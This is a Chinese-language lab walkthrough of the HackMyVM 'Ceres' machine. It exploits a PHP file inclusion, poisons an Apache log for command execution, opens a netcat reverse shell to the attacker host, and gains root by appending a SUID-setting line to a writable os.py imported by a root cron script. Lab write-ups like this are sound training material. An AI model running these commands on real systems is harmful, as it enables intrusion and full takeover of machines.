@@ -1,0 +1,383 @@
+> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/RuekkMI4ME-nXrnL82PIpg)
+
+No.61 Ceres
+===========
+
+ ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 61篇原创内容   公众号
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUtzQKSw1BUywQHGicgz1NIYV7wN1w5uvPoUwJn0zeAwyvESMUYGwFN8DCVGMYgibuMBvCibicmbkhqRfw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)  
+
+靶机信息
+----
+
+下载地址:
+
+```
+https://hackmyvm.eu/machines/machine.php?vm=Ceres  
+网盘链接：https://pan.baidu.com/s/1MYO7cEOg2xou1FrC40v6qg?pwd=ja7r
+```
+
+靶场: HackMyVm.eu
+
+靶机名称: Ceres
+
+难度: 简单
+
+发布时间: 2021年3月8日
+
+提示信息:
+
+```
+无
+```
+
+目标: user.txt和root.txt
+
+  
+
+实验环境
+----
+
+```
+攻击机:VMware kali 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only  
+  
+靶机:Vbox linux IP自动获取 网卡host-Only
+```
+
+  
+
+信息收集
+----
+
+### 扫描主机
+
+扫描局域网内的靶机IP地址(攻击机有2块网块需要-I指定网卡，如果只有一块网卡不需要加参数)
+
+```
+sudo arp-scan -l -I eth1
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到主机地址为10.0.0.115
+
+### 扫描端口
+
+扫描靶机开放的服务端口
+
+```
+sudo nmap -sC -sV -p- 10.0.0.115 -oN nmap.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到22端口和80端口，先来看看80端口
+
+Web渗透
+-----
+
+```
+http://10.0.0.115
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后是apache2的默认页面，来做个目录扫描
+
+### 目录扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.115 -x php,txt,html,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+扫描到robots.txt文件和planet目录，先来看看robots.txt
+
+```
+curl http://10.0.0.115/robots.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+没用，再来看看planet目录
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+打开后是一张图片没有任何提示，继续目录扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.115/planet -x php,txt,html,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现file.php和secret.php，先来看看file.php
+
+```
+http://10.0.0.115/planet/file.php
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+访问后是空白页面，猜测可以读取文件，用模糊测试验证一下
+
+```
+wfuzz -c -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.0.115/planet/file.php?FUZZ=/etc/passwd --hw=0
+```
+
+换了几个字典都跑不到，可能路径不对，不能读passwd我们读同目录下的secret.php，读php需要使用伪协议并转换为base64
+
+```
+wfuzz -c -w /usr/share/wordlists/rockyou.txt -u http://10.0.0.115/planet/file.php?FUZZ=php://filter/convert.base64-encode/resource=secret.php --hh 0
+```
+
+结果并不好，由于无法读取passwd猜想是不是源码中添加了其他内容，
+
+```
+wfuzz -c -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.0.115/planet/file.php?FUZZ=php://filter/convert.base64-encode/resource=secret --hh 0 -t 64
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+取消了扩展名后终于得到了参数，先来看看fiel.php的源码
+
+```
+http://10.0.0.115/planet/file.php?file=php://filter/convert.base64-encode/resource=file
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+base64解码
+
+```
+echo 'PD9waHAKICAgIGluY2x1ZGUoJF9HRVRbImZpbGUiXS4iLnBocCIpOwo/Pgo=' | base64 -d
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+源码中补上了扩展名，再来看看secret.php
+
+利用模糊测试时间再来看一下secret.php
+
+```
+http://10.0.0.115/planet/file.php?file=php://filter/convert.base64-encode/resource=secret
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+```
+echo 'PD9waHAKICAgIHN5c3RlbSgiaWQiKTsgLy8gICAgICAgICAgICAgICAgICAvTXlfSDFkZDNuX1MzY3IzdAo/Pgo=' | base64 -d
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+代码写死了不能利用，后面有一个注释应该是目录，验证一下
+
+```
+http://10.0.0.115/planet/My_H1dd3n_S3cr3t/
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+  
+
+访问后又是空的，再次做个目录扫描
+
+```
+gobuster dir -w ../../Dict/SecLists-2022.1/Discovery/Web-Content/directory-list-2.3-medium.txt  -u http://10.0.0.115/planet/My_H1dd3n_S3cr3t/ -x php,txt,html,zip
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+又是文件读取，来看看
+
+```
+http://10.0.0.115/planet/My_H1dd3n_S3cr3t/file.php?file=/etc/passwd
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+看来这回不加扩展名了，找到一个用户giuseppe,试试还能读到什么文件
+
+```
+http://10.0.0.115/planet/My_H1dd3n_S3cr3t/file.php?file=/var/log/apache2/access.log
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+可以读到日志，这里可以通过user-agnet插入一句话来毒化日志，再利用文件包含漏洞来读取日志达到执行命令
+
+1。User-Agent插入一句话木马
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+  
+
+2。验证payload
+
+```
+http://10.0.0.116/planet/My_H1dd3n_S3cr3t/file.php?file=/var/log/apache2/access.log&haha=id
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+验证成功，现在来反弹shell到攻击机上
+
+1。攻击机监听4444端口
+
+```
+nc -lvvp 4444
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。执行反弹shell命令
+
+```
+http://10.0.0.116/planet/My_H1dd3n_S3cr3t/file.php?file=/var/log/apache2/access.log&haha=bash -c 'nc 10.0.0.3 4444 -e "/bin/bash"'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+反弹成功，先切换成交互式shell
+
+```
+python3 -c 'import pty;pty.spawn("/bin/bash")'  
+export TERM=xterm  
+Ctrl+z  
+stty raw -echo;fg  
+reset
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+切换完成，来找一下敏感信息
+
+```
+sudo -l
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+可以使用giuseppe用户身份执行python
+
+```
+sudo -u giuseppe python -c 'import os;os.system("/bin/bash")'
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+显示的不太友好，但是提权成功了，继续找敏感信息
+
+```
+cd /home/giuseppe  
+ls  
+cat user.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到user.txt，上传个脚本来检查可提权内容
+
+1。攻击机在脚本目录开启http服务
+
+```
+python3 -m http.server
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+2。靶机下载pspy64
+
+```
+cd /tmp  
+wget http://10.0.0.3:8000/pspy64  
+chmod +x pspy64  
+./pspy64
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+发现root用户在后台运行py脚本，来看看这个脚本执行了哪些内容
+
+```
+cd /opt  
+ls  
+cat important.py
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+脚本内执行了导入os库，其他内容都被 注释掉了下面的3个command命令是在提示，
+
+命令1：为/bin/bash添加suid权限；
+
+命令2：执行/bin/bash -p 提权
+
+命令3：验证是否提权成功
+
+由于只导入了os库，那我们只能从这个库入手了，先找一下库的位置
+
+```
+find / -name os.py 2>/dev/null
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+检查是否能修改
+
+```
+ls -al /usr/lib/python2.7/os.py
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+有写入权限 ，来按提示操作一下
+
+```
+
+
+which bash
+
+  
+
+echo 'import os;os.system("/usr/bin/chmod 4755 /usr/bin/bash")' >> /usr/lib/python2.7/os.py
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+然后等待几分钟内，检查bash是否添加s权限
+
+```
+ls -al /bin/bash
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+添加成功，可以提权了
+
+```
+/usr/bin/bash -p  
+id
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+提权成功，找一下flag
+
+```
+cd /root  
+ls  
+cat root.txt
+```
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+拿到root.txt，游戏结束
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
+
+![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)
